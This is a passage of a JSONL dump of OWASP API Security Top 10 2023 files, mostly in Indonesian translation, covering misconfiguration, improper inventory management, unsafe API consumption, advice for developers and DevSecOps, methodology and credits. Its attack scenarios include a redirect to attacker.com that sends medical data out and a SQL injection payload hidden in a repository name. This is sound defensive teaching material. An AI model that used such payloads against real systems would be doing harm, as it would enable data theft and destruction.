tidak menyertakaj header tanggapan HTTP `Cache-Control`, percakapan pribadi akan disimpan dalam cache browser web, memungkinkan\npelaku jahat mengambilnya dari file cache browser dalam sistem file.\n\n## Cara Mencegah\n\nSiklus hidup API harus mencakup:\n\n* Proses pengerasan berulang yang menghasilkan penerapan lingkungan yang terkunci dengan benar dengan cepat dan mudah\n* Tugas untuk meninjau dan memperbarui konfigurasi di seluruh stack API. Tinjauan harus mencakup: file orkestrasi, komponen API, dan layanan cloud\n  (misalnya, izin bucket S3)\n* Proses otomatis untuk terus-menerus menilai efektivitas konfigurasi dan pengaturan di semua lingkungan\n\nSelain itu:\n\n* Pastikan semua komunikasi API dari klien ke server API dan komponen hulu/hilir terjadi melalui saluran komunikasi yang terenkripsi\n  (TLS), tanpa memandang apakah itu API internal atau publik.\n* Lebih spesifik tentang verba HTTP mana pun yang dapat diakses oleh setiap API: semua verba HTTP lainnya harus dinonaktifkan (misalnya, HEAD).\n* API yang diharapkan diakses dari klien berbasis browser (misalnya, front-end WebApp) harus setidaknya:\n    * mengimplementasikan kebijakan Cross-Origin Resource Sharing (CORS) yang tepat\n    * menyertakan Header Keamanan yang berlaku\n* Batasi jenis konten/format data masuk hanya pada yang memenuhi persyaratan bisnis/fungsional.\n* Pastikan semua server dalam rantai server HTTP (misalnya, load balancer, reverse and forward proxy, serta server backend) memproses permintaan masuk dengan cara yang seragam untuk menghindari masalah desinkronisasi.\n* Jika memungkinkan, tentukan dan tegakkan semua skema muatan respons API, termasuk respons kesalahan, untuk mencegah pengecualian jejak dan informasi berharga lainnya dikirimkan kembali kepada pelaku serangan.\n\n## Referensi\n\n### OWASP\n\n* [Proyek OWASP Secure Headers][1]\n* [Pengujian Konfigurasi dan Manajemen Implementasi - Panduan Pengujian Keamanan Web Guide][2]\n* [Pengujian Penanganan Kesalahan - Panduan Pengujian Keamanan Web][3]\n* [Pengujian Cross Site Request Forgery - Panduan Pengujian Keamanan Web][4]\n\n### Eksternal\n\n* [CWE-2: Kelemahan Keamanan Lingkungan][5]\n* [CWE-16: Konfigurasi][6]\n* [CWE-209: Pembuatan Pesan Kesalahan yang Mengandung Informasi Sensitif][7]\n* [CWE-319: Pengiriman Teks Terbuka Informasi Sensitif][8]\n* [CWE-388: Penanganan Kesalahan][9]\n* [CWE-444: Interpretasi Tidak Konsisten Permintaan HTTP ('HTTP Request/Response Smuggling')][10]\n* [CWE-942: Kebijakan Lintas Domain yang Permissif dengan Domain yang Tidak Terpercaya][11]\n* [Panduan Keamanan Umum Server][12], NIST\n* [Let's Encrypt: Otoritas Sertifikat Gratis, Otomatis, dan Terbuka][13]\n\n[1]: https://owasp.org/www-project-secure-headers/\n[2]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README\n[3]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/README\n[4]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery\n[5]: https://cwe.mitre.org/data/definitions/2.html\n[6]: https://cwe.mitre.org/data/definitions/16.html\n[7]: https://cwe.mitre.org/data/definitions/209.html\n[8]: https://cwe.mitre.org/data/definitions/319.html\n[9]: https://cwe.mitre.org/data/definitions/388.html\n[10]: https://cwe.mitre.org/data/definitions/444.html\n[11]: https://cwe.mitre.org/data/definitions/942.html\n[12]: https://csrc.nist.gov/publications/detail/sp/800-123/final\n[13]: https://letsencrypt.org/\n", "timestamp": "2025-10-24T22:27:00.633594"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/id/0xa9-improper-inventory-management.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/id/0xa9-improper-inventory-management.md", "content": "# API9:2023 Pengelolaan Inventaris yang Tidak Tepat\n\n| Agen Ancaman/Vektor Serangan | Kelemahan Keamanan | Dampak |\n| - | - | - |\n| Khusus API : Kemungkinan Dieksploitasi **Mudah** | Prevalensi **Luas** : Kemungkinan Dideteksi **Sedang** | Teknis **Sedang** : Khusus Bisnis |\n| Agen ancaman biasanya mendapatkan akses tidak sah melalui versi API lama atau endpoint yang tidak diperbaiki dan menggunakan persyaratan keamanan yang lebih lemah. Dalam beberapa kasus, eksploitasi tersedia. Atau, mereka mungkin mendapatkan akses ke data sensitif melalui pihak ketiga yang tidak ada alasan untuk berbagi data dengannya. | Dokumentasi yang sudah kadaluarsa membuat lebih sulit untuk menemukan dan/atau memperbaiki kerentanan. Ketidakadaan inventaris aset dan strategi pensiun mengakibatkan sistem yang tidak diperbaiki, yang mengakibatkan kebocoran data sensitif. Sangat umum untuk menemukan host API yang terpapar secara tidak perlu karena konsep modern seperti mikro layanan, yang membuat aplikasi mudah untuk dideploy dan mandiri (misalnya, komputasi awan, K8S). Cukup dengan Google Dorking, enumerasi DNS, atau menggunakan mesin pencari khusus untuk berbagai jenis server (webcam, router, server, dll.) yang terhubung ke internet akan cukup untuk menemukan target. | Penyerang dapat memperoleh akses ke data sensitif, atau bahkan mengambil alih server. Terkadang berbagai versi/deployment API terhubung ke database yang sama dengan data nyata. Agen ancaman dapat mengeksploitasi endpoint yang sudah tidak digunakan yang tersedia dalam versi API lama untuk mendapatkan akses ke fungsi administratif atau mengeksploitasi kerentanan yang sudah dikenal. |\n\n## Apakah API Rentan?\n\nSifat API dan aplikasi modern yang tersebar dan terhubung membawa tantangan baru. Penting bagi organisasi untuk tidak hanya memiliki pemahaman yang baik dan visibilitas terhadap API dan endpoint API mereka sendiri, tetapi juga bagaimana API menyimpan atau berbagi data dengan pihak ketiga eksternal.\n\nMenjalankan beberapa versi API memerlukan sumber daya manajemen tambahan\ndari penyedia API dan memperluas permukaan serangan.\n\nSebuah API memiliki \"<ins>blindspot dokumentasi</ins>\" jika:\n\n* Tujuan host API tidak jelas, dan tidak ada jawaban eksplisit untuk\n  pertanyaan-pertanyaan berikut\n    * Lingkungan mana yang digunakan API (misalnya, produksi, staging, tes,\n    pengembangan)?\n    * Siapa yang seharusnya memiliki akses jaringan ke API (misalnya, publik, internal, mitra)?\n    * Versi API mana yang sedang berjalan?\n* Tidak ada dokumentasi atau dokumentasi yang ada tidak diperbarui.\n* Tidak ada rencana pensiun untuk setiap versi API.\n* Inventaris host hilang atau sudah kadaluarsa.\n\nVisibilitas dan inventaris aliran data sensitif memainkan peran penting sebagai\nbagian dari rencana respons insiden, jika terjadi pelanggaran di sisi pihak ketiga.\n\nSebuah API memiliki \"<ins>blindspot aliran data</ins>\" jika:\n\n* Ada \"aliran data sensitif\" di mana API berbagi data sensitif dengan pihak ketiga dan\n    * Tidak ada justifikasi bisnis atau persetujuan atas aliran tersebut\n    * Tidak ada inventaris atau visibilitas aliran tersebut\n    * Tidak ada visibilitas mendalam tentang jenis data sensitif yang dibagikan\n\n\n## Contoh Skenario Serangan\n\n### Skenario #1\n\nSebuah jaringan sosial mengimplementasikan mekanisme pembatasan laju yang menghalangi penyerang\nmenggunakan metode brute force untuk menebak token reset kata sandi. Mekanisme ini tidak\ndiimplementasikan sebagai bagian dari kode API itu sendiri tetapi di komponen terpisah antara\nklien dan API resmi (`api.socialnetwork.owasp.org`). Seorang peneliti menemukan host API beta\n(`beta.api.socialnetwork.owasp.org`) yang menjalankan API yang sama, termasuk mekanisme reset kata sandi,\ntetapi mekanisme pembatasan laju tidak ada. Peneliti tersebut berhasil mereset kata sandi\npengguna dengan menebak token 6 digit menggunakan brute force.\n\n### Skenario #2\n\nSebuah jaringan sosial memungkinkan pengembang aplikasi independen untuk mengintegrasikan dengan\nmereka. Sebagai bagian dari proses ini, izin diminta dari pengguna akhir, sehingga jaringan sosial\ndapat berbagi informasi pribadi pengguna dengan aplikasi independen.\n\nAliran data antara jaringan sosial dan aplikasi independen tidak cukup dibatasi atau dimonitor,\nmemungkinkan aplikasi independen untuk mengakses tidak hanya\ninformasi pengguna tetapi juga informasi pribadi dari semua teman mereka.\n\nSebuah firma konsultan membangun aplikasi berbahaya dan berhasil mendapatkan izin dari\n270.000 pengguna. Karena kelemahan ini, firma konsultan berhasil mengakses\ninformasi pribadi dari 50.000.000 pengguna. Kemudian, firma konsultan\nmenjual informasi tersebut untuk tujuan berbahaya.\n\n## Cara Mencegah\n\n* Inventarisasi semua <ins>host API</ins> dan dokumentasikan aspek penting dari masing-masing di\n  antaranya, berfokus pada lingkungan API (misalnya, produksi, staging, tes, pengembangan), siapa yang\n  seharusnya memiliki akses jaringan ke host (misalnya, publik, internal, mitra) dan versi API.\n* Inventarisasi <ins>layanan terintegrasi</ins> dan dokumentasikan aspek penting seperti peran mereka\n  dalam sistem, data apa yang dipertukarkan (aliran data), dan sensitivitasnya.\n* Dokumentasikan semua aspek API Anda seperti otentikasi, kesalahan, pengalihan, pembatasan laju,\n  kebijakan berbagi sumber daya lintas asal (CORS), dan endpoint, termasuk parameter, permintaan, dan tanggapan.\n* Hasilkan dokumentasi secara otomatis dengan mengadopsi standar terbuka. Sertakan pembangunan dokumentasi dalam jalur CI/CD Anda.\n* Buat dokumentasi API hanya tersedia bagi mereka yang berwenang untuk menggunakan API.\n* Gunakan langkah-langkah perlindungan eksternal seperti solusi keamanan API yang spesifik untuk semua versi API Anda yang terpapar, tidak hanya untuk versi produksi saat ini.\n* Hindari menggunakan data produksi dengan implementasi API non-produksi. Jika hal ini tidak dapat dihindari, endpoint ini harus mendapatkan perlakuan keamanan yang sama dengan endpoint produksi.\n* Ketika versi API yang lebih baru mencakup perbaikan keamanan, lakukan analisis risiko untuk\n  memberi tahu tindakan mitigasi yang diperlukan untuk versi lama. Misalnya, apakah memungkinkan untuk melakukan backport perbaikan tanpa merusak kompatibilitas API atau apakah Anda perlu segera menghapus versi lama dan memaksa semua klien beralih ke versi terbaru.\n\n\n## Referensi\n\n### Eksternal\n\n* [CWE-1059: Dokumentasi yang Tidak Lengkap][1]\n\n[1]: https://cwe.mitre.org/data/definitions/1059.html", "timestamp": "2025-10-24T22:27:00.749388"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/id/0xaa-unsafe-consumption-of-apis.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/id/0xaa-unsafe-consumption-of-apis.md", "content": "# API10:2023 Konsumsi API yang Tidak Aman\n\n| Agen Ancaman/Vektor Serangan | Kelemahan Keamanan | Dampak |\n| - | - | - |\n| Khusus API : Kemungkinan Dieksploitasi **Mudah** | Prevalensi **Umum** : Kemungkinan Dideteksi **Sedang** | Teknis **Serius** : Khusus Bisnis |\n| Penyerang perlu mengidentifikasi dan mungkin mengkompromikan API/Layanan lain yang terintegrasi dengan API target untuk mengeksploitasi masalah ini. Biasanya, informasi ini tidak tersedia secara publik atau API/layanan yang terintegrasi tidak mudah dieksploitasi. | Para pengembang cenderung percaya dan tidak memverifikasi endpoint yang berinteraksi dengan API eksternal atau pihak ketiga, mengandalkan persyaratan keamanan yang lebih lemah seperti yang berkaitan dengan keamanan transportasi, otentikasi/otorisasi, dan validasi serta sanitasi input. Penyerang perlu mengidentifikasi layanan yang terintegrasi dengan API target (sumber data) dan, akhirnya, mengkompromikannya. | Dampaknya bervariasi sesuai dengan apa yang dilakukan API target dengan data yang diambil. Eksploitasi yang berhasil dapat menyebabkan paparan informasi sensitif kepada aktor yang tidak diotorisasi, banyak jenis injeksi, atau penolakan layanan. |\n\n## Apakah API Rentan?\n\nPengembang cenderung lebih percaya data yang diterima dari API pihak ketiga daripada masukan pengguna. Hal ini terutama berlaku untuk API yang ditawarkan oleh perusahaan-perusahaan terkemuka. Karena itu, pengembang cenderung mengadopsi standar keamanan yang lebih lemah, misalnya dalam hal validasi dan sanitasi input.\n\nAPI mungkin rentan jika:\n\n* Berinteraksi dengan API lain melalui saluran yang tidak terenkripsi;\n* Tidak memvalidasi dan menyaring data yang dikumpulkan dari API lain sebelum\n  memprosesnya atau melewatkan data tersebut ke komponen yang lebih rendah;\n* Mengikuti pengalihan tanpa pertimbangan;\n* Tidak membatasi jumlah sumber daya yang tersedia untuk memproses respons layanan pihak ketiga;\n* Tidak mengimplementasikan batas waktu untuk interaksi dengan layanan pihak ketiga;\n\n## Contoh Skenario Serangan\n\n### Skenario #1\n\nSebuah API mengandalkan layanan pihak ketiga untuk memperkaya alamat bisnis yang diberikan oleh pengguna akhir. Ketika alamat diberikan kepada API oleh pengguna akhir, alamat tersebut dikirim ke layanan pihak ketiga dan data yang dikembalikan kemudian disimpan dalam database lokal yang mendukung SQL.\n\nAktor jahat menggunakan layanan pihak ketiga untuk menyimpan muatan SQLi yang terkait dengan bisnis yang dibuat oleh mereka. Kemudian mereka menyerang API yang rentan dengan memberikan masukan khusus yang membuatnya menarik \"bisnis berbahaya\" mereka dari layanan pihak ketiga. Muatan SQLi akhirnya dieksekusi oleh database, mengirimkan data ke server yang dikendalikan oleh penyerang.\n\n### Skenario #2\n\nSebuah API terintegrasi dengan penyedia layanan pihak ketiga untuk menyimpan secara aman informasi medis sensitif pengguna. Data dikirim melalui koneksi aman menggunakan permintaan HTTP seperti di bawah ini:\n\n```\nPOST /user/store_phr_record\n{\n  \"genome\": \"ACTAGTAG__TTGADDAAIICCTT…\"\n}\n```\n\nAktor jahat menemukan cara untuk mengkompromikan API pihak ketiga dan mulai memberikan respons `308 Permanent Redirect` untuk permintaan seperti di atas.\n\n```\nHTTP/1.1 308 Permanent Redirect\nLocation: https://attacker.com/\n```\n\nKarena API mengikuti pengalihan dari layanan pihak ketiga tanpa mempertimbangkannya, ia akan mengirimkan permintaan yang sama persis termasuk data sensitif pengguna, namun kali ini ke server penyerang.\n\n### Skenario #3\n\nSeorang penyerang dapat menyiapkan repositori git yang diberi nama `'; drop db;--`.\n\nSekarang, ketika integrasi dari aplikasi yang diserang dilakukan dengan repositori jahat ini, muatan injeksi SQL digunakan pada aplikasi yang membangun kueri SQL yang percaya bahwa nama repositori adalah masukan yang aman.\n\n## Cara Mencegah\n\n* Saat mengevaluasi penyedia layanan, nilai postur keamanan API mereka.\n* Pastikan semua interaksi API terjadi melalui saluran komunikasi yang aman (TLS).\n* Selalu validasi dan lakukan sanitasi data yang diterima dari API terintegrasi sebelum menggunakannya.\n* Pelihara daftar whitelist lokasi yang dikenal API terintegrasi yang dapat mengalihkan\n  permintaan Anda: jangan mengikuti pengalihan tanpa pertimbangan.\n\n\n## Referensi\n\n### OWASP\n\n* [Cheat Sheet Keamanan Layanan Web][1]\n* [Kekurangan Injeksi][2]\n* [Cheat Sheet Validasi Input][3]\n* [Cheat Sheet Pencegahan Injeksi][4]\n* [Cheat Sheet Perlindungan Lapisan Transport][5]\n* [Cheat Sheet Pengalihan dan Pengalihan Tanpa Validasi][6]\n\n### Eksternal\n\n* [CWE-20: Validasi Input yang Tidak Tepat][7]\n* [CWE-200: Paparan Informasi Sensitif kepada Aktor yang Tidak Diotorisasi][8]\n* [CWE-319: Pengiriman Teks Terbuka Informasi Sensitif][9]\n\n[1]: https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html\n[2]: https://www.owasp.org/index.php/Injection_Flaws\n[3]: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html\n[4]: https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html\n[5]: https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html\n[6]: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html\n[7]: https://cwe.mitre.org/data/definitions/20.html\n[8]: https://cwe.mitre.org/data/definitions/200.html\n[9]: https://cwe.mitre.org/data/definitions/319.html", "timestamp": "2025-10-24T22:27:00.857181"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/id/0xb0-next-devs.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/id/0xb0-next-devs.md", "content": "# Apa Selanjutnya untuk Pengembang\n\nTugas untuk membuat dan memelihara aplikasi yang aman, atau memperbaiki aplikasi yang sudah ada, bisa menjadi sulit. Ini tidak berbeda untuk API.\n\nKami percaya bahwa pendidikan dan kesadaran adalah faktor kunci dalam menulis perangkat lunak yang aman. Semua yang diperlukan untuk mencapai tujuan ini bergantung pada **mendirikan dan menggunakan proses keamanan yang dapat diulang serta kendali keamanan standar**.\n\nOWASP menyediakan banyak sumber daya gratis dan terbuka untuk membantu Anda mengatasi masalah keamanan. Silakan kunjungi [halaman Proyek OWASP][1] untuk daftar komprehensif proyek yang tersedia.\n\n| | |\n|-|-|\n| **Pendidikan** | [Pemandu Keamanan Aplikasi][2] seharusnya memberi Anda gambaran baik tentang proyek-proyek yang tersedia untuk setiap tahap/fase Siklus Hidup Pengembangan Perangkat Lunak (SDLC). Untuk pembelajaran/latihan langsung, Anda dapat memulainya dengan [OWASP **crAPI** - **C**ompletely **R**idiculous **API**][3] atau [OWASP Juice Shop][4]: keduanya memiliki API yang rentan secara disengaja. [Proyek Direktori Aplikasi Web Rentan OWASP][5] menyediakan daftar aplikasi yang rentan secara disengaja: Anda akan menemukan beberapa API rentan lainnya di sana. Anda juga dapat menghadiri sesi pelatihan [Konferensi OWASP AppSec][6], atau [bergabung dengan cabang lokal Anda][7]. |\n| **Persyaratan Keamanan** | Keamanan seharusnya menjadi bagian setiap proyek sejak awal. Ketika mendefinisikan persyaratan, penting untuk mendefinisikan apa arti \"aman\" untuk proyek tersebut. OWASP merekomendasikan Anda menggunakan [Standar Verifikasi Keamanan Aplikasi OWASP (ASVS)][8] sebagai panduan untuk menetapkan persyaratan keamanan. Jika Anda mengalihdayakan, pertimbangkan [Lampiran Kontrak Perangkat Lunak Aman OWASP][9], yang harus disesuaikan sesuai dengan hukum dan regulasi setempat. |\n| **Arsitektur Keamanan** | Keamanan seharusnya tetap menjadi perhatian selama semua tahapan proyek. [Seri Contekan OWASP][10] adalah titik awal yang baik untuk panduan tentang bagaimana mendesain keamanan selama fase arsitektur. Di antara banyak lainnya, Anda akan menemukan [Contekan Keamanan REST][11] dan [Contekan Penilaian REST][12], serta [Contekan GraphQL][13]. |\n| **Kendali Keamanan Standar** | Mengadopsi kendali keamanan standar mengurangi risiko memasukkan kelemahan keamanan saat menulis logika Anda sendiri. Meskipun banyak kerangka kerja modern sekarang dilengkapi dengan kendali standar yang efektif, [Kendali Proaktif OWASP][14] memberikan pandangan yang baik tentang kendali keamanan apa yang seharusnya Anda sertakan dalam proyek Anda. OWASP juga menyediakan beberapa perpustakaan dan alat yang mungkin Anda temukan berguna, seperti kendali validasi. |\n| **Siklus Hidup Pengembangan Perangkat Lunak Aman** | Anda dapat menggunakan [Model Kematangan Jaminan Perangkat Lunak OWASP (SAMM)][15] untuk meningkatkan proses pembuatan API Anda. Beberapa proyek OWASP lainnya tersedia untuk membantu Anda dalam berbagai tahap pengembangan API, misalnya, [Panduan Tinjauan Kode OWASP][16]. |\n\n[1]: https://owasp.org/projects/\n[2]: https://owasp.org/projects/#owasp-projects-the-sdlc-and-the-security-wayfinder\n[3]: https://owasp.org/www-project-crapi/\n[4]: https://owasp.org/www-project-juice-shop/\n[5]: https://owasp.org/www-project-vulnerable-web-applications-directory/\n[6]: https://owasp.org/events/\n[7]: https://owasp.org/chapters/\n[8]: https://owasp.org/www-project-application-security-verification-standard/\n[9]: https://owasp.org/www-community/OWASP_Secure_Software_Contract_Annex\n[10]: https://cheatsheetseries.owasp.org/\n[11]: https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html\n[12]: https://cheatsheetseries.owasp.org/cheatsheets/REST_Assessment_Cheat_Sheet.html\n[13]: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html\n[14]: https://owasp.org/www-project-proactive-controls/\n[15]: https://owasp.org/www-project-samm/\n[16]: https://owasp.org/www-project-code-review-guide/", "timestamp": "2025-10-24T22:27:00.966825"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/id/0xb1-next-devsecops.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/id/0xb1-next-devsecops.md", "content": "# Apa Selanjutnya untuk DevSecOps\n\nKarena pentingnya mereka dalam arsitektur aplikasi modern, membangun API yang aman adalah suatu keharusan. Keamanan tidak boleh diabaikan, dan itu harus menjadi bagian dari seluruh siklus pengembangan. Pemindaian dan pengujian penetrasi setahun sekali tidak lagi cukup.\n\nDevSecOps harus bergabung dengan upaya pengembangan, memfasilitasi pengujian keamanan berkelanjutan di seluruh siklus pengembangan perangkat lunak. Tujuan Anda harus meningkatkan jalur pengembangan dengan otomatisasi keamanan, tanpa mempengaruhi kecepatan pengembangan.\n\nJika ragu, tetap terinformasi, dan lihat [Manifesto DevSecOps][1].\n\n| | |\n|-|-|\n| **Mengerti Model Ancaman** | Prioritas pengujian berasal dari model ancaman. Jika Anda belum memilikinya, pertimbangkan untuk menggunakan [Standar Verifikasi Keamanan Aplikasi OWASP (ASVS)][2], dan [Panduan Pengujian OWASP][3] sebagai masukan. Melibatkan tim pengembangan akan membantu membuat mereka lebih sadar akan keamanan. |\n| **Mengerti SDLC** | Bergabunglah dengan tim pengembangan untuk lebih memahami Siklus Hidup Pengembangan Perangkat Lunak. Kontribusi Anda pada pengujian keamanan berkelanjutan harus sesuai dengan orang, proses, dan alat. Semua orang harus setuju dengan proses tersebut, sehingga tidak ada gesekan atau resistensi yang tidak perlu. |\n| **Strategi Pengujian** | Karena pekerjaan Anda tidak boleh mempengaruhi kecepatan pengembangan, Anda harus bijak memilih teknik terbaik (sederhana, cepat, paling akurat) untuk memverifikasi persyaratan keamanan. [Kerangka Pengetahuan Keamanan OWASP][4] dan [Standar Verifikasi Keamanan Aplikasi OWASP][2] dapat menjadi sumber terbaik persyaratan keamanan fungsional dan non-fungsional. Terdapat sumber-sumber bagus lainnya untuk [proyek][5] dan [alat][6] yang serupa dengan yang ditawarkan oleh [komunitas DevSecOps][7]. |\n| **Mencapai Cakupan dan Akurasi** | Anda adalah jembatan antara tim pengembangan dan tim operasi. Untuk mencapai cakupan, Anda harus fokus tidak hanya pada fungsionalitas, tetapi juga orkestrasi. Bekerja erat dengan tim pengembangan dan operasi sejak awal sehingga Anda dapat mengoptimalkan waktu dan usaha Anda. Anda harus bertujuan untuk mencapai suatu tahap ketika keamanan esensial diverifikasi secara berkelanjutan. |\n| **Komunikasikan Temuan dengan Jelas** | Memberikan nilai dengan sedikit atau tanpa gesekan. Sampaikan temuan dengan tepat waktu, dalam alat yang digunakan tim pengembangan (bukan file PDF). Bergabung dengan tim pengembangan untuk mengatasi temuan. Manfaatkan kesempatan ini untuk memberi mereka pendidikan, jelaskan kelemahan dan bagaimana kelemahan bisa disalahgunakan, termasuk skenario serangan untuk membuatnya nyata. |\n\n[1]: https://www.devsecops.org/\n[2]: https://owasp.org/www-project-application-security-verification-standard/\n[3]: https://owasp.org/www-project-web-security-testing-guide/\n[4]: https://owasp.org/www-project-security-knowledge-framework/\n[5]: http://devsecops.github.io/\n[6]: https://github.com/devsecops/awesome-devsecops\n[7]: http://devsecops.org", "timestamp": "2025-10-24T22:27:01.078034"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/id/0xd0-about-data.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/id/0xd0-about-data.md", "content": "# Metodologi dan Data\n\n## Ringkasan\n\nUntuk pembaruan daftar ini, tim Keamanan API OWASP menggunakan metodologi yang sama dengan yang digunakan untuk daftar tahun 2019 yang sukses dan banyak diadopsi, dengan tambahan [Panggilan Data Publik][1] selama 3 bulan. Sayangnya, panggilan data ini tidak menghasilkan data yang memungkinkan analisis statistik yang relevan mengenai masalah keamanan API yang paling umum.\n\nNamun, dengan industri keamanan API yang lebih matang dan mampu memberikan umpan balik dan wawasan langsung, proses pembaruan terus berlanjut dengan menggunakan metodologi yang sama seperti sebelumnya.\n\nSampai di sini, kami percaya bahwa kami telah memiliki dokumen kesadaran yang fokus ke depan untuk tiga atau empat tahun mendatang, yang lebih berfokus pada masalah khusus API modern. Tujuan dari proyek ini bukanlah menggantikan daftar 10 besar lainnya, tetapi sebaliknya untuk menangani risiko keamanan API teratas yang ada dan yang akan datang, yang menurut kami harus diperhatikan oleh industri.\n\n## Metodologi\n\nDalam fase pertama, data yang tersedia secara publik tentang insiden keamanan API dikumpulkan, ditinjau, dan dikategorikan. Data tersebut dikumpulkan dari platform bug bounty dan laporan yang tersedia secara publik. Hanya masalah yang dilaporkan antara 2019 dan 2022 yang dipertimbangkan. Data ini digunakan untuk memberikan gambaran pada tim mengenai ke arah mana daftar 10 besar sebelumnya seharusnya berkembang serta membantu mengatasi bias atas data yang disumbangkan.\n\n[Panggilan Data Publik][1] berjalan mulai dari 1 September hingga 30 November 2022. Secara paralel, tim proyek mulai mendiskusikan apa yang telah berubah sejak 2019. Diskusi tersebut mencakup dampak dari daftar sebelumnya, umpan balik yang diterima dari komunitas, dan tren baru dalam keamanan API.\n\nTim proyek mempromosikan pertemuan dengan spesialis tentang ancaman keamanan API yang relevan untuk mendapatkan wawasan tentang bagaimana korban terpengaruh dan bagaimana ancaman-ancaman tersebut dapat diatasi.\n\nUpaya ini menghasilkan draf awal tentang apa yang tim percayai sebagai sepuluh risiko keamanan API yang paling kritis. [Metodologi Penilaian Risiko OWASP][2] digunakan untuk melakukan analisis risiko. Peringkat prevalensi diputuskan dari konsensus di antara anggota tim proyek, berdasarkan pengalaman mereka di lapangan. Untuk pertimbangan-pertimbangan tentang masalah ini, silakan lihat bagian [Risiko Keamanan API][3].\n\nDraf awal kemudian dibagikan untuk ditinjau oleh praktisi keamanan dengan pengalaman relevan di bidang keamanan API. Komentar mereka ditinjau, didiskusikan, dan jika berlaku, dimasukkan dalam dokumen. Dokumen yang dihasilkan [dipublikasikan sebagai Calon Rilis][4] untuk [diskusi terbuka][5]. Beberapa [kontribusi komunitas][6] dimasukkan ke dalam dokumen final.\n\nDaftar kontributor tersedia dalam bagian [Ucapan Terimakasih][7].\n\n## Risiko Khusus API\n\nDaftar ini dibangun untuk mengatasi risiko keamanan yang lebih spesifik untuk API.\n\nHal ini tidak berarti bahwa risiko keamanan aplikasi generik lainnya tidak ada dalam aplikasi berbasis API. Sebagai contoh, kami tidak memasukkan risiko seperti \"Komponen yang Rentan dan Sudah Ketinggalan Zaman\" atau \"Injection\", meskipun Anda mungkin menemukannya dalam aplikasi berbasis API. Risiko-risiko ini bersifat generik, mereka tidak berperilaku berbeda dalam API, dan eksploitasi mereka juga tidak berbeda.\n\nTujuan kami adalah meningkatkan kesadaran tentang risiko keamanan yang memerlukan perhatian khusus dalam API.\n\n[1]: https://owasp.org/www-project-api-security/announcements/cfd/2022/\n[2]: https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology\n[3]: ./0x10-api-security-risks.md\n[4]: https://owasp.org/www-project-api-security/announcements/2023/02/api-top10-2023rc\n[5]: https://github.com/OWASP/API-Security/issues?q=is%3Aissue+label%3A2023RC\n[6]: https://github.com/OWASP/API-Security/pulls?q=is%3Apr+label%3A2023RC\n[7]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:27:01.182188"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/id/0xd1-acknowledgments.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/id/0xd1-acknowledgments.md", "content": "# Ucapan Terima Kasih\n\n## Ucapan Terima Kasih kepada Kontributor\n\nKami ingin mengucapakn terima kasih kepada kontributor berikut ini yang telah berkontribusi secara terbuka melalui GitHub, atau melalui cara lainnya:\n\n247arjun, abunuwas, Alissa Knight, Arik Atar, aymenfurter, Corey J. Ball, cyn8,\nd0znpp, Dan Gordon, donge, Dor Tumarkin, faizzaidi, gavjl, guybensimhon, Inês\nMartins, Isabelle Mauny, Ivan Novikov, jmanico, Juan Pablo, k7jto, LaurentCB,\nllegaz, Maxim Zavodchik, MrPRogers, planetlevel, rahulk22, Roey Eliyahu, Roshan\nPiyush, securitylevelup, sudeshgadewar123, Tatsuya-hasegawa, tebbers, vanderaj,\nwenz, xplo1t-sec, Yaniv Balmas, ynvb\n", "timestamp": "2025-10-24T22:27:01.300572"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/pt-pt/0x00-header.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/pt-pt/0x00-header.md", "content": "---\ntitle: ''\ndescription: OWASP API Security Top 10 2023\n---\n\n![OWASP LOGO](images/cover.jpg)\n\n| | | |\n| - | - | - |\n| https://owasp.org | Distribuído ao abrigo da licença [Creative Commons Attribution-ShareAlike 4.0 International License][1] | ![Creative Commons License Logo](images/front-cc.png) |\n\n[1]: http://creativecommons.org/licenses/by-sa/4.0/\n\n\n", "timestamp": "2025-10-24T22:27:01.745208"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/pt-pt/0x00-notice.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/pt-pt/0x00-notice.md", "content": "# Nota\n\nEsta é a versão de texto do OWASP API Security Top 10, usada como fonte para \nquaisquer versões oficiais deste documento como por exemplo o website.\n\nContribuições para o projeto tais como comentários, correções ou traduções devem\nser feitas aqui. Para mais detalhes sobre [Como Contribuir][1], por favor\nconsulte a secção [CONTRIBUTING.md][1].\n\n* Erez Yallon\n* Inon Shkedy\n* Paulo Silva\n\n[1]: ../../../CONTRIBUTING.md\n", "timestamp": "2025-10-24T22:27:01.849141"}
